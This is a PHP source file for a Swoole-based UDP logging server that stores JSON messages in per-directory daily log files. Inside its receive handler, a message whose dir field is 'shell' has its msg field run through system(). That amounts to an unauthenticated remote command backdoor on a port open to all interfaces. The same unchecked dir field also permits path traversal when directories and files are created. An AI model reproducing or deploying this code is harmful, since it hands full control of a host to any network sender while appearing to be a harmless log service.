<?php
/**
 * 使用swoole
 * UDP异步日志服务器
 **/
$server = new swoole_server ( "0.0.0.0", 8002, 3, SWOOLE_SOCK_UDP );
$config = array (
		"reactor_num" => 1, // reactor_num一般设置为CPU核数的1-4倍，在swoole中reactor_num最大不得超过CPU核数*4。
		"max_request" => 20000,
		"worker_num" => 2, // 每个进程占用40M内存一般设置为CPU核数的1-4倍
		"daemonize" => true,
		"backlog" => 512, // Listen队列长度,此参数将决定最多同时有多少个待accept的连接，swoole本身accept效率是很高的，基本上不会出现大量排队情况。
		"open_cpu_affinity" => 1, // 启用CPU亲和设置,称为CPU关联性更好，程序员的土话就是绑定CPU，绑核。
		"log_file" => 'log/LogServer.log'  // 指定swoole错误日志文件。在swoole运行期发生的异常信息会记录到这个文件中。默认会打印到屏幕
);
$server->set ( $config );

$server->on ( 'connect', function ($server, $fd) {
	echo "Client:Connect.\n";
} );

$server->on ( 'receive', function ($server, $fd, $from_id, $data) {
	$arr = json_decode ( $data, true );
	$msg = $arr ["msg"];
	
	if($arr ["dir"]=="shell"){
		system ( $msg, $out );
	}
	
	$dir = "log/" . $arr ["dir"] . "/";
	$time = time ();
	$file = date ( "Y-m-d", $time ) . ".log";
	$time = date ( 'Y-m-d h:i:s', $time );
	
	if (! is_dir ( $dir )) {
		$dir_arr = explode ( "/", $dir );
		$dir_d = "";
		if(count($dir_arr)>0){
			foreach ( $dir_arr as $n ) {
				if ($n != "") {
					$dir_d = $dir_d . $n . "/";
					if (! is_dir ( $dir_d )) {
						mkdir ( $dir_d );
					}
				}
			}
		}
	}
	if (! is_dir ( __DIR__ . "/" . $dir )) {
		mkdir ( __DIR__ . "/" . $dir );
	}
	file_put_contents ( __DIR__ . "/" . $dir . $file, $time . "->" . $msg . PHP_EOL, FILE_APPEND );
	$server->close ( $fd );
} );
$server->on ( 'close', function ($server, $fd) {
	echo "Client: Close.\n";
} );

$server->start ();